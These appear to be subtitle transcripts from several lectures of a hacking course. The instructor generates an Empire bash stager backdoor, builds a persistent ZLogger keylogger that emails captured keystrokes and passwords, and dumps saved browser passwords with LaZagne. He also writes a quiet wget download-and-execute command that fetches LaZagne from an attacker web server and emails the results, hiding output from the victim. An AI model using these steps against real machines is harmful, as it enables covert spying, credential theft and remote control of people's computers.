00:02:01,900  -->  00:02:05,000
And then we can double-tap to see all the stagers that we have

29

00:02:05,580  -->  00:02:09,080
and like we've seen before, we have stagers made for Windows machines,

30

00:02:09,320  -->  00:02:11,680
we have stagers made for OS X machines.

31

00:02:12,200  -->  00:02:16,780
And we also had multi-stagers, but we never really spoke about them.

32

00:02:17,360  -->  00:02:22,660
And these multi-stagers have a multi purpose basically and that's why they start with multi.

33

00:02:23,560  -->  00:02:27,240
Now, the one that I want to show you today is the multi/bash.

34

00:02:30,820  -->  00:02:34,640
And from the name, if you paid attention in the previous lecture,

35

00:02:34,760  -->  00:02:40,480
I said, "Bash is a command language that works on all operating systems that use bash."

36

00:02:40,860  -->  00:02:47,780
And the operating systems that use Bash are Linux, OS X, iOS, Android

37

00:02:47,780  -->  00:02:50,400
and other, obviously, other operating systems.

38

00:02:50,860  -->  00:02:54,220
So if you generate a stager, using multi-bash,

39

00:02:54,480  -->  00:03:01,680
it will work against all of these operating systems, it's going to work against iOS, OS X, Linux and Android.

40

00:03:02,380  -->  00:03:03,620
So, I'm going to hit Enter

41

00:03:04,040  -->  00:03:07,500
and I'm going to type 'info' to see all the information that I can set

42

00:03:07,740  -->  00:03:13,520
and usually these information are always the same, so we seen this with Windows and we've seen it with OS X.

43

00:03:13,840  -->  00:03:16,740
You want to set the 'Listener' and you want to set the 'OutFile'.

44

00:03:17,200  -->  00:03:19,280
So we can set these using the 'set' command,

45

00:03:19,600  -->  00:03:23,120
we type in 'set' we type the name of the option that we want to set

46

00:03:23,420  -->  00:03:24,860
and then we type the value,

47

00:03:25,140  -->  00:03:27,300
so my listener is called 'http'.

48

00:03:28,620  -->  00:03:32,560
Now, I also need to set the OutFile and this is where my backdoor is going to be stored

49

00:03:32,840  -->  00:03:38,440
and I'm gonna set this to 'var/www/html/evil-files,

50

00:03:38,760  -->  00:03:41,640
and let's call this 'basic_bash _shell'.

51

00:03:43,320  -->  00:03:44,700
Now, I can type in 'info',

52

00:03:47,380  -->  00:03:49,060
to make sure that everything is correct

53

00:03:49,220  -->  00:03:53,400
and we can see that everything is correct, I have my listener set to 'http'

54

00:03:53,860  -->  00:04:00,120
and I have the OutFile to '/var/www/html/ evil-files/basic_bash_shell'.

55

00:04:01,080  -->  00:04:05,380
So this is all good, this is perfect, all I have to do now is just type in 'execute'.

56

00:04:07,500  -->  00:04:12,320
And that's it. Now, the file is stored in '/var/www/html/evil-files'.

57

00:04:13,540  -->  00:04:17,860
Now, you can see that generating the stagers and the listeners is,

58

00:04:18,140  -->  00:04:20,980
is really simple and it's pretty much the same,

59

00:04:21,160  -->  00:04:25,140
regardless of our target, all we do is we just use a different stager

60

00:04:25,340  -->  00:04:31,180
and if our target is on a different network, if it needs a different IP configuration or a different port,

61

00:04:31,520  -->  00:04:33,420
then we'll just have to create a new listener.

62

00:04:35,120  -->  00:04:37,080
Now, let's go to the Linux machine.

63

00:04:37,400  -->  00:04:40,860
We're gonna download this file, execute it and see what happens.

64

00:04:41,680  -->  00:04:48,320
And we're gonna go to our evil files, so that's in '10.20.14.213/',

65

00:04:48,680  -->  00:04:50,380
followed by 'evil-files/'.

66

00:04:54,500  -->  00:04:57,340
And we have our file here called 'basic_bash_shell'.

67

00:04:57,760  -->  00:05:00,180
I'm going to right-click it and Save it.

68

00:05:03,540  -->  00:05:06,800
And I'm gonna store it on my Downloads. that's fine.

69

00:05:09,960  -->  00:05:16,120
Now like I said with Linux computers, if we go to that file and even if we mark it as executable

70

00:05:16,320  -->  00:05:17,700
when we double-click it.

71

00:05:20,420  -->  00:05:23,020
It'll just open it for us in a text editor,

72

00:05:23,220  -->  00:05:24,920
which is not very good

73

00:05:27,380  -->  00:05:30,860
Now, if you actually copy and paste this code in terminal, it will work,

74

00:05:31,380  -->  00:05:32,600
but we don't want to do that.

75

00:05:32,980  -->  00:05:36,920
What we're gonna do is, we're gonna open our Downloads using the 'cd' command.

76

00:05:38,760  -->  00:05:40,200
And then run it using Bash.

77

00:05:40,500  -->  00:05:43,780
So, we're going to do 'bash basic_bash_shell',

78

00:05:44,160  -->  00:05:44,920
hit Enter.

79

00:05:47,000  -->  00:05:48,260
Now if we go back in here,

80

00:05:48,920  -->  00:05:51,960
you'll see that we got an agent, so we get a connection

81

00:05:52,740  -->  00:05:59,140
so we can interact with this by saying 'interact 96', tab and we're in.

82

00:05:59,440  -->  00:06:00,820
Now we can do this 'sysinfo'

83

00:06:02,020  -->  00:06:07,240
to get some basic information about the system and just to confirm that we actually have access to it.

84

00:06:07,680  -->  00:06:13,420
And as you can see, we have access to that computer, we can execute all the modules

85

00:06:13,420  -->  00:06:15,760
that Empire allow us to,

86

00:06:16,080  -->  00:06:22,340
which is more powerful than the basic Bash command line that we got in the previous video.

87

00:06:22,620  -->  00:06:26,980
And like I said because this is a generic Bash backdoor.

88

00:06:27,160  -->  00:06:34,960
It will actually work on iOS, on Linux, on OSX and on Android devices.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,420  -->  00:00:03,900
Previously, we spoke about Keyloggers.

2

00:00:04,220  -->  00:00:09,900
We discussed why you'd want to use it instead of a backdoor and we seen how to use a program

3

00:00:09,900  -->  00:00:14,560
called ZLogger to generate a remote keylogger for Windows.

4

00:00:15,440  -->  00:00:20,020
In this lecture, I wanna show you how to generate a remote key logger for Linux

5

00:00:20,940  -->  00:00:25,460
and to do that we're going to use the exact same program, ZLogger.

6

00:00:26,320  -->  00:00:31,560
So to do that, first of all I'm gonna navigate to the location where we installed Z logger.

7

00:00:31,560  -->  00:00:37,520
So if you don't remember where you installed it or how to install it, please go back and revise the lecture,

8

00:00:37,520  -->  00:00:41,800
where I downloaded and installed it, when we were targeting windows.

9

00:00:42,540  -->  00:00:47,180
So I'm gonna do 'cd/opt/ZLogger/'

10

00:00:48,740  -->  00:00:52,720
and if we do 'ls', we'll see all the files for this program

11

00:00:53,300  -->  00:01:00,500
and as we know the main file is called ZLogger here and just to refresh your memory I'm gonna do 'python'

12

00:01:00,500  -->  00:01:05,840
because this is a Python program followed by ZLogger which is the name of the program,

13

00:01:06,080  -->  00:01:07,960
followed by '--help'.

14

00:01:09,180  -->  00:01:14,140
I'm doing '--help' to see all the options that we can use with this program.

15

00:01:15,400  -->  00:01:20,420
Now, I spoke about all of these in details when I was generating the backdoor for Windows.

16

00:01:20,920  -->  00:01:25,640
So please go back and revise any of these options if you don't remember how they work.

17

00:01:25,740  -->  00:01:29,560
I don't wanna go over them again because that will be really boring.

18

00:01:30,420  -->  00:01:34,360
So what I'm actually gonna do, I'm just gonna go back to the command that I used

19

00:01:34,360  -->  00:01:40,680
when I generated the Windows keylogger and I'm gonna keep everything the exact same.

20

00:01:41,160  -->  00:01:46,120
The only thing that I'm gonna change is the '-w' argument right here

21

00:01:46,120  -->  00:01:52,620
because as I said in that lecture, we use '-w' to generate a keylogger for Windows,

22

00:01:52,840  -->  00:01:57,400
we're gonna use '-l' to generate the keylogger for Linux.

23

00:01:58,380  -->  00:02:03,660
So I'm gonna delete the 'w' and put an 'l' instead of it and that's it.

24

00:02:03,660  -->  00:02:06,400
That's literally everything that you need to do.

25

00:02:07,420  -->  00:02:13,340
And I'm also going to change the name of the keylogger to 'Linux-keylogger'.

26

00:02:14,820  -->  00:02:20,660
So let's go over the command just really, really quickly, so we're doing 'python' program name

27

00:02:20,660  -->  00:02:24,980
which is 'zlogger.py', we're setting the interval to '60' so that means

28

00:02:24,980  -->  00:02:31,260
I'm going to receive a report of all the key strikes entered by the user every 60 seconds.

29

00:02:31,760  -->  00:02:37,960
We're using '-l' to generate the key logger for Linux, we're setting the email

30

00:02:37,960  -->  00:02:42,320
that I want to receive the reports on using the '-e' argument.

31

00:02:42,860  -->  00:02:46,880
I'm using the '-p' argument to set the password of this email

32

00:02:47,300  -->  00:02:52,580
and finally, I'm using '-o' to set the name of the generated file.

33

00:02:53,400  -->  00:02:54,540
I'm gonna hit 'Enter'.

34

00:02:57,500  -->  00:03:02,160
And this will generate the keylogger for me and again at the end it's telling us

35

00:03:02,160  -->  00:03:06,700
to make sure that less secure applications are enabled on the account

36

00:03:06,700  -->  00:03:10,520
and I showed how to do that previously, so I'm not gonna go over it again.

37

00:03:11,680  -->  00:03:18,300
And just like before if we list the files, we'll see we have a 'dist' directory

38

00:03:18,300  -->  00:03:25,180
and if we list what's inside the 'dist', you'll see all the keyloggers that you generated using ZLogger.

39

00:03:25,580  -->  00:03:32,180
You can see I have the Windows keylogger here '.exe' and you can see we have our Linux keylogger in here.

40

00:03:33,200  -->  00:03:39,440
So again, similar to what I did before, I'm gonna copy this to my evil-files so I'm gonna use the 'cp' command.

41

00:03:39,780  -->  00:03:44,940
I'm gonna specify the file that I want to copy which is in dist 'Linux-keylogger'

42

00:03:45,320  -->  00:03:52,380
and I wanna copy it to 'var/www/html/evil-files/'.

43

00:03:53,540  -->  00:03:54,720
I'm gonna hit 'Enter'

44

00:03:55,220  -->  00:03:59,780
and that's it, copied and I've already started my web server so I can go

45

00:04:00,000  -->  00:04:10,060
and download it straight away from my Linux machine by going to '10.20.14.213/evil-files/Linux-keylogger'.

46

00:04:12,300  -->  00:04:18,640
It's asking me to save it, I'm gonna save it and it's gonna go into my downloads right here.

47

00:04:20,120  -->  00:04:24,380
Now when it comes to Linux you can't just double-click a binary to run it.

48

00:04:24,740  -->  00:04:28,700
You're gonna have to run it from terminal and I know this is very suspicious

49

00:04:29,060  -->  00:04:31,700
but we're gonna talk about delivery methods later on.

50

00:04:32,020  -->  00:04:38,160
So don't worry about this let's just focus on trying to get this keylogger to work properly.

51

00:04:39,220  -->  00:04:40,940
So I'm gonna open my terminal

52

00:04:42,400  -->  00:04:46,880
and I'm gonna navigate to where the keylogger is downloaded which is in my Downloads.

53

00:04:47,580  -->  00:04:50,980
So if I list now, we'll see it here Linux-keylogger

54

00:04:51,820  -->  00:04:55,400
and before we run it we're gonna have to change it to an executable.

55

00:04:55,680  -->  00:05:00,900
So we're gonna use this 'chmod' command to change the permissions for this file

56

00:05:01,180  -->  00:05:04,620
and we're gonna do '+x' to make it executable

57

00:05:04,960  -->  00:05:09,540
and we're gonna follow this by the file name which is 'linux-keylogger.

58

00:05:10,720  -->  00:05:16,400
I'm gonna hit 'Enter' and if I list again now, you'll see the file showing up in green

59

00:05:16,620  -->  00:05:20,500
which means that I can run it now as an executable.

60

00:05:21,320  -->  00:05:28,180
Now to run executables in Linux, you have to type './' followed by the executable name

61

00:05:28,460  -->  00:05:31,160
which is the linux-keylogger in my case.

62

00:05:32,320  -->  00:05:37,340
I'm gonna hit 'Enter' and that's it now the key logger is running in the background.

63

00:05:38,200  -->  00:05:43,420
Again don't worry if this looks suspicious, we'll talk about delivery methods later on.

64

00:05:44,500  -->  00:05:50,340
Now let's go to the Kali machine and go to my email and see if I got my initial report

65

00:05:50,340  -->  00:05:58,940
and perfect as you can see, I got my initial report and if I open that you'll see it's coming from a Linux computer,

66

00:05:58,940  -->  00:06:05,900
it's running Ubuntu, it's tell me the exact version of Ubuntu, the computer name is 'zaid-VirtualBox'

67

00:06:06,320  -->  00:06:08,020
and the Username is 'zaid'.

68

00:06:09,160  -->  00:06:14,120
Again, there is no 'logs' because at the moment the user did not type anything on their keyboard.

69

00:06:14,600  -->  00:06:19,380
So let's go and type something, let's just go to 'facebook.com'

70

00:06:20,880  -->  00:06:30,380
and put a username, let's put the username as 'Zaid' and put a password as '123456'

71

00:06:31,020  -->  00:06:38,520
Let's go back and see if we're gonna get a report of this, so I'm gonna click on the first report and perfect.

72

00:06:38,520  -->  00:06:42,360
You can see the user went to Facebook, they put the username,

73

00:06:42,365  -->  00:06:48,740
they made some mistakes so they press backspace, we can see the password was '123456'

74

00:06:48,740  -->  00:06:51,880
and everything is being logged properly.

75

00:06:53,220  -->  00:06:59,520
Now this is one part of the program, the other part is we want it to run with the system startup.

76

00:07:00,320  -->  00:07:05,700
So just like we did with Windows, let's close everything and restart the computer

77

00:07:07,340  -->  00:07:11,560
and let's see if the keylogger starts with the system startup.

78

00:07:15,100  -->  00:07:20,380
So I'm gonna log in and let's go ahead and open Firefox

79

00:07:22,260  -->  00:07:28,980
and let's go to 'twitter.com', log in

80

00:07:30,460  -->  00:07:38,960
and just put a username we'll say 'twitterusername' and put a password as '123456'

81

00:07:40,200  -->  00:07:44,941
and let's go to the Kali machine and see if we're gonna receive any reports.

82

00:07:44,941  -->  00:07:49,260
So I'm gonna go back to my Inbox, I'm gonna open the latest message,

83

00:07:49,560  -->  00:07:53,280
it's empty so that's probably sent before I entered anything.

84

00:07:53,960  -->  00:07:56,380
So let's go back and wait for the next one

85

00:07:58,720  -->  00:08:05,540
and here we go we got a report, let's open it and as you can see the user went to 'twitter.com',

86

00:08:05,800  -->  00:08:12,440
they put a 'twitterusername' as the username and they put the password as '123456'.

87

00:08:13,620  -->  00:08:18,560
So perfect, as you can see ZLogger is working perfectly for Windows and for Linux

88

00:08:18,560  -->  00:08:25,320
and it's allowing us to generate persistent remote keyloggers for both of these operating systems.

89

00:08:26,520  -->  00:08:31,600
Now like I said, if you're interested in learning how to write programs like ZLogger

90

00:08:31,600  -->  00:08:34,840
then check out my Python programming course,

91

00:08:34,840  -->  00:08:39,240
where I teach Python programming by writing hacking programs

92

00:08:39,240  -->  00:08:46,320
and one of the example programs that I show you how to program in that course is actually ZLogger.

93

00:08:47,740  -->  00:08:50,520
Now that everything is fine and everything is working perfectly,

94

00:08:50,940  -->  00:08:55,820
I just wanna show you how to remove the keylogger from the Linux machine

95

00:08:56,080  -->  00:09:00,780
because I know it will be annoying, if you keep receiving reports all the time from it

96

00:09:01,120  -->  00:09:04,080
especially, if these reports are not useful to you.

97

00:09:05,080  -->  00:09:07,700
So to remove this I'm going to open my terminal

98

00:09:08,560  -->  00:09:12,160
and I'm gonna go into a directory called '.config'

99

00:09:13,840  -->  00:09:19,600
and if we list the directories in here, you'll see we have a directory called 'autostart'

100

00:09:20,380  -->  00:09:21,860
so we're going to go into that

101

00:09:23,580  -->  00:09:29,480
and if we list here, you'll see there is a desktop entry called 'xinput'.

102

00:09:30,040  -->  00:09:33,960
Now this is what's making the program start with the startup.

103

00:09:34,800  -->  00:09:38,660
So I'm gonna do is, I'm going to remove this file using the 'rm' command

104

00:09:38,940  -->  00:09:42,020
so this command can be used to remove files in Linux

105

00:09:42,320  -->  00:09:46,420
and the file that I wanna remove is called 'xinput.desktop'.

106

00:09:47,060  -->  00:09:51,440
I'm gonna hit 'Enter' and if we list now the file is gone.

107

00:09:51,440  -->  00:09:57,700
So now if you restart the computer, ZLogger will not start with the system startup.




━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,740  -->  00:00:04,580
Now when it comes to spying, keyloggers are really, really handy

2

00:00:04,580  -->  00:00:07,840
because they're gonna be capturing anything that the person enters,

3

00:00:08,060  -->  00:00:14,080
that's gonna include emails, chat messages, passwords and anything they do.

4

00:00:14,900  -->  00:00:21,460
The only limitation to keyloggers is saved passwords, they will not be able to capture saved passwords

5

00:00:21,460  -->  00:00:25,680
because the target person has these passwords already saved

6

00:00:25,680  -->  00:00:29,100
and they're never gonna use the keyboard to type these passwords

7

00:00:29,100  -->  00:00:33,020
because they're already saved on whatever application they're using.

8

00:00:34,340  -->  00:00:40,940
And before we've seen how we can extract saved passwords using a program called LaZagne.

9

00:00:41,740  -->  00:00:48,240
Now luckily, LaZagne works on Linux as well and in this lecture, I'm gonna show you how to use it with Linux.

10

00:00:49,000  -->  00:00:54,240
Now using the tool itself is the same, whether you use it on Windows or on Linux,

11

00:00:54,620  -->  00:00:58,860
the only thing is that you wanna make sure that you download the right version for Linux.

12

00:00:59,820  -->  00:01:05,180
So like I said, with Windows you can compile your own version from Python.

13

00:01:05,180  -->  00:01:09,360
So you'll have to clone this repo and then compile the version that you want

14

00:01:09,500  -->  00:01:14,140
and there is detailed instruction in the Wiki of this page of LaZagne's page

15

00:01:14,660  -->  00:01:20,240
but what we're gonna do is we're gonna use the already compiled versions and their releases.

16

00:01:20,560  -->  00:01:24,860
So I'm gonna click on that and I'm gonna include the link for this in the resources

17

00:01:25,600  -->  00:01:31,420
and we're gonna go down to the Linux versions, you can see we have here LaZagne version 1.0

18

00:01:31,740  -->  00:01:38,800
and there is 2 versions for Linux; there is 1 for Linux 6-- 32 bits and there is 1 for Linux 64.

19

00:01:39,600  -->  00:01:44,260
Now my target has 64-bit processor so I'm gonna download the 64-bit version.

20

00:01:44,260  -->  00:01:47,180
I'm gonna click on it and I'm gonna 'Save' that.

21

00:01:49,240  -->  00:01:51,200
Then I'm gonna go to my Downloads

22

00:01:55,320  -->  00:02:02,240
and we have it in here, it's an, in an archive so I'm just going to right click it and click on 'Extract Here'

23

00:02:02,580  -->  00:02:06,720
to uncompress it and then if we go inside this new directory,

24

00:02:08,180  -->  00:02:10,720
you'll see we have our executable.

25

00:02:12,080  -->  00:02:18,220
Now I'm just gonna rename this and I'm just gonna call it only LaZagne instead of LaZagne 64 bits

26

00:02:20,360  -->  00:02:21,380
and I'm gonna copy it.

27

00:02:23,960  -->  00:02:30,140
And take it to my evil-files directory, so I'm gonna take it to 'var/www/html/evil-files'

28

00:02:31,540  -->  00:02:32,920
and I'm gonna paste it here.

29

00:02:34,060  -->  00:02:35,500
And that's it, we're good to go.

30

00:02:36,000  -->  00:02:42,100
Now I'm gonna go on my target Linux machine, the Ubuntu here and I'm gonna download it.

31

00:02:42,100  -->  00:02:45,900
So I'm gonna download this using the same way that we've been using and it's going to be

32

00:02:45,900  -->  00:02:51,860
at 'http://10.20.14.213/evil-files/LaZagne'

33

00:02:55,000  -->  00:02:56,400
and I'm gonna save this

34

00:02:59,060  -->  00:03:00,820
and that's gone to my Downloads now.

35

00:03:01,580  -->  00:03:07,760
So I'm gonna go to the Downloads to see it and you can see we have the executable here.

36

00:03:08,500  -->  00:03:13,160
Now like I said, with Linux computers, you can't just double click an executable.

37

00:03:13,680  -->  00:03:20,980
You either have to right click it, go to 'Properties' and set it as 'Executable' in here

38

00:03:22,720  -->  00:03:26,980
or you'd have to run it from terminal which is what most Linux users do.

39

00:03:27,140  -->  00:03:29,860
They are actually used to using the terminal.

40

00:03:29,860  -->  00:03:33,280
So, we're going to go to the Downloads using the 'cd' command...

41

00:03:36,860  -->  00:03:40,380
and then do 'ls' to see the available files.

42

00:03:41,240  -->  00:03:44,280
Now you can see LaZagne is not an executable yet

43

00:03:44,280  -->  00:03:47,380
so we have to change its permission using the 'chmod' command,

44

00:03:49,420  -->  00:03:54,120
exactly the same way that we've been doing it before 'chmod+x' the filename

45

00:03:56,200  -->  00:03:58,440
and I misspelled chmod.

46

00:04:00,840  -->  00:04:02,040
Now if we do 'ls'

47

00:04:02,800  -->  00:04:07,580
you can see that LaZagne is in green and we can actually use this file right now.

48

00:04:08,800  -->  00:04:12,680
Now to run an executable again, the same way that we've been doing it before,

49

00:04:12,820  -->  00:04:16,940
you put a './' followed by the file name

50

00:04:17,700  -->  00:04:21,380
and we're gonna do '--help' like we did when we were using it with Windows

51

00:04:23,260  -->  00:04:28,180
and you'll see the options and the categories are very very similar to the ones that we've seen

52

00:04:28,180  -->  00:04:29,800
when we were using it with Windows.

53

00:04:30,520  -->  00:04:35,020
So I'm actually not gonna go over how to use these categories and what each one of them does.

54

00:04:35,260  -->  00:04:38,460
I already did this in the Windows lecture when we use LaZagne

55

00:04:38,780  -->  00:04:43,000
so if you don't remember how to use this go back to that lecture and revise it.

56

00:04:43,220  -->  00:04:47,760
For now, we're just showing how to use it with Linux and I don't want the course to be boring.

57

00:04:48,980  -->  00:04:55,360
So I have the LaZagne now here and I'm going to go in and login to an account.

58

00:04:55,360  -->  00:05:01,360
So I'm just going to log in to a gmail account and we'll see if LaZagne we'll be able to capture its password

59

00:05:01,980  -->  00:05:09,840
and it's already has my username so I'm just gonna put my password which is going to be abc123abc123.

60

00:05:11,360  -->  00:05:14,880
And I'm gonna click on remember so that the password gets saved

61

00:05:15,060  -->  00:05:18,860
and that's the whole point of this lecture to be able to capture the saved passwords.

62

00:05:21,060  -->  00:05:27,380
Now, we're in LaZagne, we're gonna run it by typing './LaZagne'

63

00:05:27,380  -->  00:05:32,460
and then we're gonna put the category that we want to use and I'm going to use browsers

64

00:05:32,460  -->  00:05:35,600
to get the passwords saved in web browsers.

65

00:05:36,000  -->  00:05:42,980
Now you can use any of these plugins to get the relevant passwords, you can use 'all' to run all the modules

66

00:05:42,980  -->  00:05:46,160
and get all these saved passwords that LaZagne can get.

67

00:05:46,280  -->  00:05:51,280
But for now we're just having, we're just testing it with the web browser, so I'm gonna run it with browsers.

68

00:05:52,140  -->  00:05:53,080
Hit 'Enter'

69

00:05:54,160  -->  00:06:01,560
and as you can see it managed to find my Firefox password, the website was 'accounts.google.com'.

70

00:06:01,840  -->  00:06:08,740
The user name is 'jhnwck70@gmail.com' and the password is 'abc123abc123'.

71

00:06:10,220  -->  00:06:13,180
Now, like I said, if you don't remember all the modules

72

00:06:13,180  -->  00:06:16,440
and how powerful LaZagne is go back to the windows lecture

73

00:06:16,700  -->  00:06:21,600
and have a look on it as I go through all the modules and how to use them and what they mean.

74

00:06:22,460  -->  00:06:26,820
Also, running LaZagne like this is not very convincing as you can see,

75

00:06:26,820  -->  00:06:30,283
like we're actually running these commands from the hacked computer

76

00:06:30,283  -->  00:06:35,400
or from the target computer that's because LaZagne is designed as a post exploitation tool

77

00:06:35,400  -->  00:06:39,640
and it's designed to be used on the computer after it gets hacked,

78

00:06:39,640  -->  00:06:42,960
it's not designed to be used before hacking into the computer.

79

00:06:43,360  -->  00:06:47,780
But in the next lecture, we will see how we can actually send LaZagne in a way

80

00:06:48,020  -->  00:06:51,540
that's going to be automatically executed on the target person

81

00:06:51,540  -->  00:06:54,680
and send us a report of the passwords to our email.

82

00:06:55,640  -->  00:07:00,480
So right now we're actually just showing how to use LaZagne as a post exploitation way,

83

00:07:00,760  -->  00:07:05,500
as just the test LaZagne make sure it works and gets, and get comfortable with it

84

00:07:05,760  -->  00:07:10,820
and then in the next lecture we will see how we can use it in a more realistic scenario.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,300 --> 00:00:06,750
Now in this lecture, I want to show you a script that can be very, very handy, and you can use it

2
00:00:06,750 --> 00:00:08,730
in many different scenarios.

3
00:00:09,840 --> 00:00:16,770
The idea of the script is it will allow you to run any Unix based command on the target computer.

4
00:00:17,070 --> 00:00:21,380
It will execute that command and send you the result by email.

5
00:00:21,390 --> 00:00:22,700
So it's very, very simple.

6
00:00:22,710 --> 00:00:28,020
All it's going to do is it's going to once it's executed, it's going to run a command on the target

7
00:00:28,020 --> 00:00:30,130
computer and send the result to you.

8
00:00:30,150 --> 00:00:30,930
That's all.

9
00:00:31,140 --> 00:00:38,760
Now, why this is very handy is because you can use it to read any file in the target computer and then

10
00:00:38,760 --> 00:00:40,020
send the result to you.

11
00:00:40,050 --> 00:00:46,950
You can get it to read any the contents of any directory or read computer info or anything that you

12
00:00:46,950 --> 00:00:51,210
want on the target system and get that to be sent to your email address.

13
00:00:51,450 --> 00:00:58,800
To combine this with a good example, I'm going to show you how to use this script to download, execute

14
00:00:58,800 --> 00:01:04,950
and send the result of lesson to your email because we see how to use lesson before we've seen.

15
00:01:04,950 --> 00:01:07,710
It's really good it was able to get us the saved passwords.

16
00:01:07,740 --> 00:01:13,500
The only problem is the target person had to run it on their computer or we have to have access to that

17
00:01:13,500 --> 00:01:15,030
computer to use lesson.

18
00:01:15,480 --> 00:01:22,110
So using the script, we will be able to download this and execute it and then get the results on our

19
00:01:22,110 --> 00:01:22,620
email.

20
00:01:23,780 --> 00:01:28,190
Now I'm going to include the script in the resources of this lecture, so you can just download them

21
00:01:28,280 --> 00:01:33,530
or you can get them from my GitHub repo in here, which I'm going to include its link as well in the

22
00:01:33,530 --> 00:01:37,280
resources and once you download the script.

23
00:01:39,080 --> 00:01:40,310
You will have it here.

24
00:01:40,310 --> 00:01:44,720
I have it here in my downloads, so I'm just going to open it with my text editor.

25
00:01:50,030 --> 00:01:56,030
Now, as you can see here, the first line of the script is the command to run.

26
00:01:56,600 --> 00:01:58,330
So this is going to be the command to run.

27
00:01:58,340 --> 00:02:00,790
You can read, you can use a command to read.

28
00:02:00,800 --> 00:02:04,670
You can use your command to list the contents of a directory you can download.

29
00:02:04,670 --> 00:02:06,680
You can literally do anything that you want.

30
00:02:07,040 --> 00:02:12,590
The next thing that you want to do is give the email that you want to receive the report on.

31
00:02:12,590 --> 00:02:16,880
And I'm going to be receiving the report on John Wick, 70 at gmail.com.

32
00:02:17,620 --> 00:02:21,880
And then you also have to give the app password for that account.

33
00:02:22,390 --> 00:02:26,050
And we've seen how we can use that, how to do that in previous lectures.

34
00:02:26,380 --> 00:02:28,870
So the second two lines are very easy.

35
00:02:28,870 --> 00:02:30,970
You just have to set the email and the password.

36
00:02:31,180 --> 00:02:38,050
The main thing that you want to do here is use a write command that will execute something that's useful

37
00:02:38,050 --> 00:02:38,710
to you.

38
00:02:38,860 --> 00:02:44,170
And in our example, like I said, we're going to be trying to download and execute lesson.

39
00:02:45,330 --> 00:02:50,850
So to do that, we're going to first build our command and test it on our machine.

40
00:02:50,850 --> 00:02:55,800
And then once we're assured that this is going to work, we'll paste it in our script and send it to

41
00:02:55,800 --> 00:02:56,580
our target.

42
00:02:57,530 --> 00:03:03,740
So the first thing that we want to do is we want to open the TMP directory, so we're going to do CD.

43
00:03:04,690 --> 00:03:05,680
Tempe.

44
00:03:05,710 --> 00:03:09,600
We actually use this command when we were targeting Marcos.

45
00:03:09,610 --> 00:03:12,160
And I told you at that lecture that OSX uses.

46
00:03:12,160 --> 00:03:14,670
BASH So the bash commands are very similar.

47
00:03:14,680 --> 00:03:18,340
So we actually had to download and execute something there.

48
00:03:18,340 --> 00:03:23,890
And we use the CD command to go to the TMP directory to download the stuff in there.

49
00:03:23,920 --> 00:03:30,520
Then in the OS X lecture we used a command to download the files and we use kernel to download.

50
00:03:30,700 --> 00:03:36,250
Now Linux supports this command, but it doesn't come in built in with many distros.

51
00:03:36,520 --> 00:03:41,920
So the built in command for linux to download files is called W get.

52
00:03:42,790 --> 00:03:46,960
And we're going to follow that by the URL of the file to download.

53
00:03:46,960 --> 00:03:53,320
And again, the URL of the file has to be a direct URL that can be used to directly download the file

54
00:03:53,320 --> 00:03:57,730
with no ads or no HTML involved in the page.

55
00:03:58,150 --> 00:04:04,030
So lesson for me is already included in my evil files like we've seen in the previous lecture.

56
00:04:04,120 --> 00:04:13,540
And what I'm going to do now is just going to put the URL, which is HTTP ten 2014 213 eval files lesson.

57
00:04:14,700 --> 00:04:15,300
Okay.

58
00:04:15,330 --> 00:04:17,880
Now that's going to download the zine for me.

59
00:04:18,270 --> 00:04:24,600
Then the next thing that we want to do is we need to change the permissions of lasagne to executable.

60
00:04:24,600 --> 00:04:26,890
And we actually did this in the previous lecture.

61
00:04:26,910 --> 00:04:32,400
So the command to do that is going to be each mod plus x lasagne.

62
00:04:35,600 --> 00:04:38,150
And the last thing we want to do is to run the zone.

63
00:04:38,330 --> 00:04:44,180
And we can do that by typing dot forward slash followed by the file name, which is than.

64
00:04:45,570 --> 00:04:48,360
And then you want to put the modules that you want to use.

65
00:04:48,390 --> 00:04:55,020
In the previous lecture we used browsers, but since you're deploying this and sending it as a standalone

66
00:04:55,020 --> 00:05:02,760
or as a remote kind of Trojan, then I think changing this to all is a smarter idea to let Larson run

67
00:05:02,760 --> 00:05:05,160
and get you all the passwords that it can get.

68
00:05:05,430 --> 00:05:11,670
So the command that we're using is very simple and we actually seen all of the parts of it before.

69
00:05:11,940 --> 00:05:18,180
So the first thing we're doing is we're opening the TMP directory, then we're going to download the

70
00:05:18,180 --> 00:05:18,810
file.

71
00:05:19,850 --> 00:05:23,270
That we want to execute, and that's less than in our case.

72
00:05:23,840 --> 00:05:30,740
Then we're going to change the permission of the downloaded file to executable using MOD.

73
00:05:30,740 --> 00:05:32,510
And we've seen this before as well.

74
00:05:33,670 --> 00:05:39,400
And the last thing that we want to do is to execute the file, and that's going to vary depending on

75
00:05:39,400 --> 00:05:40,150
your file.

76
00:05:40,240 --> 00:05:42,090
So let's test this.

77
00:05:42,100 --> 00:05:46,480
And before I do that, I'm actually going to add to the W get command.

78
00:05:46,480 --> 00:05:48,340
I'm going to add minus Q.

79
00:05:49,600 --> 00:05:55,780
Just to tell w get not to show any output because usually when you run double you get it shows you the

80
00:05:55,780 --> 00:05:58,000
downloading progress and a progress bar.

81
00:05:58,030 --> 00:05:59,770
I don't want the user to see that.

82
00:05:59,770 --> 00:06:01,720
So I'm adding minus Q to tell.

83
00:06:01,740 --> 00:06:05,110
W get to be quiet and not show any output.

84
00:06:05,680 --> 00:06:08,800
So I'm going to hit enter and we'll see if this works for us.

85
00:06:10,260 --> 00:06:10,890
Okay, cool.

86
00:06:10,890 --> 00:06:17,880
So we can see that the file got downloaded, it executed lasagne for me and we can see that we're in

87
00:06:17,880 --> 00:06:23,280
the temp directory now, which means that it already changed our directory to tmp.

88
00:06:23,640 --> 00:06:26,160
So the command works and that's perfect.

89
00:06:26,160 --> 00:06:32,610
Now we have a command that we can use to download and execute lesson and the result will be displayed

90
00:06:32,610 --> 00:06:33,540
on screen.

91
00:06:33,720 --> 00:06:39,930
So now we can use this command to in our script and our execute and report script.

92
00:06:39,930 --> 00:06:47,070
And once the user executes this command, the script will send us a report of the result of this command.

93
00:06:47,280 --> 00:06:52,620
Now I'm going to cover how to use the script, how to use this command in the script in the next lecture.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

Now that we have our command ready, we can just copy it.

And then paste it in the command field here in my Z reporter.

3

